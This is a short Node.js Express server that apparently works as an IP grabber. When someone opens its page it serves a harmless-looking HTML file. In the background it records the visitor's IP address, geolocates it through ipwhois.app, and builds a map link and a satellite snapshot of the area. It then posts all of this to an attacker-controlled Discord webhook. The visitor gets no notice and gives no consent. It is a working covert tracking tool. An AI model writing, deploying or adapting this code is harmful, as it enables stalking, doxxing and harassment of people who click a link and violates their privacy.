require('dotenv').config();
const fs = require("fs");
const fetch = require('node-fetch');
const app = require("express")();
const { MessageEmbed, WebhookClient } = require('discord.js');
const webhookClient = new WebhookClient({ url:process.env.URL });
var IP = "";
app.get("/", (req, res) => {
	var fullUrl = `${req.protocol}://${req.get('host')}${req.originalUrl}`;
  console.log(`Web server hosted on: ${fullUrl}`);
  var forwardedIpsStr = req.header("x-forwarded-for");
  fs.createReadStream("yes.html").pipe(res);
  if (forwardedIpsStr) {
    IP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    console.log(IP);
		fetch(`http://ipwhois.app/json/${IP}`)
    .then(res => res.text())
    .then(text => {
			var string = text
			var placeholders = {
    		'{': '',
    		'"': '',
				',': '',
				' ': '',
				'}': ''
			}

			for(var placeholder in placeholders){
    		while(string.indexOf(placeholder) > -1) {
        	string = string.replace(placeholder, placeholders[placeholder])
   			}
			}
			var latstr = string.slice(string.search("latitude"), string.search("longitude"))
			var longstr = string.slice(string.search("longitude"), string.search("asn"))
			var latlong = [ parseFloat(latstr.slice((latstr.search(':')+1))), parseFloat(longstr.slice( (longstr.search(':')+1) ))];
			var location = `https://www.google.com/maps/@${parseFloat(latlong[0])},${parseFloat(latlong[1])},10z`;
			console.log(latlong)
			var locpic = `https://wvs.earthdata.nasa.gov/api/v1/snapshot?REQUEST=GetSnapshot&LAYERS=MODIS_Terra_CorrectedReflectance_TrueColor&CRS=EPSG:4326&TIME=2022-02-07&WRAP=DAY&BBOX=${ parseInt(latlong[0]-5)},${ parseInt(latlong[1]-5)},${ parseInt(latlong[0]+5)},${parseInt(latlong[1]+5)}&FORMAT=image/png&WIDTH=228&HEIGHT=228&AUTOSCALE=TRUE&ts=1644220232761`
			var embed = new MessageEmbed()
					.setTitle(`IP: ${IP}`)
					.setDescription(`${ JSON.stringify(JSON.parse(text), null, 2)}\n\nExact location on map:- ${location}`)
					.setImage(locpic)
					.setThumbnail(`https://flagcdn.com/256x192/${JSON.parse(text).country_code.toLowerCase()}.png`)
					.setColor("RANDOM")
			webhookClient.send({
					content: "I am here again with a new IP",
					username: 'Internet Protocol Address',
					avatarURL: 'https://www.shareicon.net/data/2016/07/10/119473_development_512x512.png',
					embeds: [embed],
				});
		});
  }
});
app.listen(process.env.PORT);